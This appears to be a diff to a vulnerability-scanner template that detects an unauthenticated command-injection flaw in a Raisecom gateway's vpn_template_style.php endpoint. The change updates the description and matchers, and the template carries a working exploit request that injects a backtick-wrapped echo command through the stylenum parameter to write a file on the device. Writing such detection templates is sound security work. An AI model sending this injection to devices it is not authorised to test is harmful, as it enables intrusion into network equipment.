@@ -1,11 +1,13 @@
 id: raisecom-rce
 
 info:
-  name: Raisecom Multi-Service Intelligent Gateway - Remote Command Execution
+  name: Raisecom Gateway vpn_template_style.php - Remote Command Execution
   author: 3th1c_yuk1
   severity: critical
   description: |
-    Remote Command Execution (RCE) vulnerability in Raisecom Multi-Service Intelligent Gateway's `vpn_template_style.php`
+    The /vpn/vpn_template_style.php endpoint in Raisecom Multi-Service Intelligent Gateway is vulnerable to unauthenticated remote command execution. The stylenum parameter fails to properly sanitize user input, allowing attackers to inject system commands using backticks (`\) or pipe (|`) characters.
+  impact: |
+    Successful exploitation allows arbitrary command execution on the target device, enabling actions such as file manipulation or system control. This vulnerability affects multiple instances and does not require authentication.
   reference:
     - https://github.com/koishi0x01/CVE/blob/main/CVE_1.md
   metadata:
@@ -26,12 +28,12 @@ http:
         GET / HTTP/1.1
         Host: {{Hostname}}
 
-    matchers-condition: and
     matchers:
-      - type: word
-        words:
-          - "<TITLE>Web user login"
+      - type: dsl
+        dsl:
           - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+          - 'contains(body, "Web user login")'
         condition: and
         internal: true
 
@@ -39,16 +41,15 @@ http:
       - |
         GET /vpn/vpn_template_style.php?mySubmit=true&stylenum=%60echo+-e+%27{{string}}%27%3E/www/tmp/{{filename}}.txt%60 HTTP/1.1
         Host: {{Hostname}}
-        Connection: close
 
       - |
         GET /tmp/{{filename}}.txt HTTP/1.1
         Host: {{Hostname}}
-        Connection: close
 
     matchers:
       - type: dsl
         dsl:
           - "status_code_1 == 200 && status_code_2 == 200"
+          - 'contains(content_type_2, "text/plain")'
           - "contains(body_2, '{{string}}')"
         condition: and
